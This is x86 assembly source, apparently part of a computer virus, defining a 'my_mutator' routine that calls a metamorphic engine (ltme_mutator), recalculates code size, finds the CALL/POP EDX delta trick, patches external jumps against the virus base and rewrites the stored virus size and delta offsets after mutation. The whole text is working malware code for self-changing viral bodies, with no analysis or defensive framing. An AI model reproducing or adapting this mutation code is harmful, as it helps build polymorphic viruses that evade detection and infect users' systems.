
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
@cr		equ	<+8*4+4>

@@free		equ	4 ptr [ebp+28 @cr]
@@malloc	equ	4 ptr [ebp+24 @cr]
@@seed		equ	4 ptr [ebp+20 @cr]
@@params	equ	4 ptr [ebp+16 @cr]
@@flags		equ	4 ptr [ebp+12 @cr]
@@plast_label	equ	4 ptr [ebp+8  @cr]
@@list		equ 	4 ptr [ebp+4  @cr]
@@size  	equ     4 ptr [ebp    @cr]

my_mutator:
		pusha
		mov ebp,esp
		
		push @@free
		push @@malloc
		push @@seed
		push @@params
		push @@flags
		push @@plast_label
		push @@list
		push @@size
		call ltme_mutator				; standart 
		add esp,4*8                                     ; mutator

		mov ebx,@@list
		mov edi,@@params
		mov esi,[ebx.list_first]


		push esi
;∞ CALCULATE SIZE ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞

		xor edx,edx					; size = 0

@@mutator_calc_size:

		movzx eax,[esi.one_data.ltmed_desc.lc_size]
		add edx,eax

		cmp 1 ptr[esi.one_data.ltmed_command],0E8h      ; CALL?
		jne @@mutator_calc_jmp

		mov eax,[esi.one_data.ltmed_link]

;-----------------------------------------------------------------------------
		push esi
		mov esi,[ebx.list_first]

@@mutator_callpopedx:
		cmp [esi.one_data.ltmed_label],eax
		je @@mutator_callpopdex_exit

		mov esi,[esi.one_next]
		jmp @@mutator_callpopedx
@@mutator_callpopdex_exit:

		cmp 1 ptr[esi.one_data.ltmed_command],5Ah	; <POP EDX>?
		pop esi
;-----------------------------------------------------------------------------
		jne @@mutator_calc_jmp

		mov ecx,edx					; ECX = delta
		jmp @@mutator_calc_next

;------------------------------------------------------------------------------
@@mutator_calc_jmp:

		test [esi.one_data.ltmed_flags],LTMED_EXTERNAL	; JMP external?
		jz @@mutator_calc_next				;

		mov eax,[edi.user_jmpdest]			;
		sub eax,[edi.user_virusbase]			; EAX=destination-
		sub eax,edx                                     ;  dest+<JMP offset>+5

		mov 4 ptr[esi.one_data.ltmed_command+1],eax

;------------------------------------------------------------------------------
@@mutator_calc_next:

		cmp esi,[ebx.list_last]
		je @@mutator_calc_exit

		mov esi,[esi.one_next]
		jmp @@mutator_calc_size

@@mutator_calc_exit:

;∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
                pop esi


@@mutator_seek_main:
		push ebx


		mov ebx,4 ptr[esi.one_data.ltmed_command+3]
                mov eax,4 ptr[esi.one_data.ltmed_command]
		and eax,00FFFFFFh

		cmp eax,1045C7h					; mov [ebp+10h],size
		jne @@mutator_delta

		cmp [edi.user_oldvirsize],ebx
		jne @@mutator_delta

		mov 4 ptr [esi.one_data.ltmed_command+3],edx	; set new size
		jmp @@mutator_next

;-----------------------------------------------------------------------------
@@mutator_delta:

		cmp eax,1445C7h					; mov [ebp+14h],delta
		jne @@mutator_next

		cmp [edi.user_olddelta],ebx
		jne @@mutator_next

		mov 4 ptr [esi.one_data.ltmed_command+3],ecx	; change delta

;-----------------------------------------------------------------------------
@@mutator_next:

		pop ebx		

		cmp esi,[ebx.list_last]
		je @@mutator_exit
	
 		mov esi,[esi.one_next]
 		jmp @@mutator_seek_main
@@mutator_exit:

		popa
		ret